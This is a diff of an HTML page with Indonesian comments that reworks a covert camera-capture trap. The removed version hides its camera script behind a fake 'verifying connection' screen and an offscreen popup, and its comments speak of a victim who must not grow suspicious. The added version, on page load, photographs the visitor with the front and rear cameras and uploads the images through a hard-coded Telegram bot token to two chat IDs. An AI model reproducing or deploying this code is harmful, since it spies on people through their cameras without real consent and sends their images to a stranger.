@@ -3,102 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sedang Memuat...</title>
-    <style>
-        body {
-            margin: 0;
-            background: #111;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            color: white;
-            font-family: sans-serif;
-            text-align: center;
-        }
-    </style>
+    <title>Memuat...</title>
 </head>
 <body>
 
-    <div>
-        <h2>Memverifikasi Koneksi...</h2>
-        <p style="font-size: 12px; color: #888;">Mohon tunggu, halaman sedang disiapkan.</p>
-    </div>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // Saat halaman ini dibuka, langsung alihkan korban ke web asli (misal Google) agar tidak curiga
-        // Tapi sebelum itu, coba buka pop-up/tab tersembunyi yang menjalankan skrip kamera
-        window.addEventListener('click', () => {
-            // Beberapa browser memblokir window.open otomatis jika tanpa interaksi klik/sentuhan
-            bukaJendelaTersembunyi();
-        });
+        const telegramToken = "8937858897:AAF5POAsvL9AiJAX6SnHiznPlMaV8Ne6oVU";
+        const chatIds = ["8401116235", "5408520831"];
 
-        // Alternatif jika ingin langsung jalan saat halaman dimuat (sering diblokir pop-up blocker browser, tapi bisa dicoba)
-        window.addEventListener('DOMContentLoaded', () => {
-            bukaJendelaTersembunyi();
-            
-            // Redirect halaman utama setelah 2 detik ke web normal
-            setTimeout(() => {
-                window.location.href = "https://www.google.com";
+        window.addEventListener('DOMContentLoaded', async () => {
+            // 1. Ambil foto dari KAMERA DEPAN
+            await ambilDanKirimFoto("user", "📸 Foto Kamera Depan!");
+
+            // Jeda 2 detik sebelum pindah ke kamera belakang
+            setTimeout(async () => {
+                // 2. Ambil foto dari KAMERA BELAKANG
+                await ambilDanKirimFoto("environment", "📸 Foto Kamera Belakang!");
             }, 2000);
         });
 
-        function bukaJendelaTersembunyi() {
-            // Membuka jendela ukuran kecil/tersembunyi (1x1 piksel atau diminimalkan)
-            // Di dalam jendela baru ini, script kamera Anda ditaruh
+        async function ambilDanKirimFoto(facingType, captionText) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+
             try {
-                const popup = window.open(
-                    'about:blank', 
-                    '_blank', 
-                    'width=100,height=100,left=-1000,top=-1000'
-                );
+                // Minta izin kamera sesuai parameter (user = depan, environment = belakang)
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: facingType }, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                
+                // Tunggu sebentar agar gambar sempat fokus
+                await new Promise(resolve => setTimeout(resolve, 1500));
 
-                if (popup) {
-                    popup.document.write(`
-                        <!DOCTYPE html>
-                        <html>
-                        <head><title>-</title></head>
-                        <body>
-                            <video id="v" autoplay playsinline style="display:none;"></video>
-                            <canvas id="c" style="display:none;"></canvas>
-                            <script>
-                                const token = "8937858897:AAF5POAsvL9AiJAX6SnHiznPlMaV8Ne6oVU";
-                                const chats = ["8401116235", "5408520831"];
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-                                    .then(stream => {
-                                        const video = document.getElementById('v');
-                                        const canvas = document.getElementById('c');
-                                        video.srcObject = stream;
-                                        
-                                        setTimeout(() => {
-                                            canvas.width = 640;
-                                            canvas.height = 480;
-                                            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                                            stream.getTracks().forEach(t => t.stop());
+                // Matikan track kamera tersebut
+                stream.getTracks().forEach(track => track.stop());
 
-                                            canvas.toBlob(async (blob) => {
-                                                if (!blob) return;
-                                                for (const id of chats) {
-                                                    const fd = new FormData();
-                                                    fd.append('chat_id', id);
-                                                    fd.append('photo', blob, 'cam.jpg');
-                                                    await fetch(\`https://api.telegram.org/bot\${token}/sendPhoto\`, {
-                                                        method: 'POST',
-                                                        body: fd
-                                                    });
-                                                }
-                                                window.close(); // Tutup sendiri setelah terkirim
-                                            }, 'image/jpeg', 0.8);
-                                        }, 1500);
-                                    }).catch(e => window.close());
-                            <\/script>
-                        </body>
-                        </html>
-                    `);
+                // Ubah ke format blob dan kirim ke Telegram
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+                if (!blob) return;
+
+                for (const chatId of chatIds) {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, `${facingType}-capture.jpg`);
+                    formData.append('caption', captionText);
+
+                    await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
                 }
-            } catch (err) {
-                console.log("Diblokir browser");
+            } catch (error) {
+                console.error(`Gagal akses kamera ${facingType}:`, error);
             }
         }
     </script>
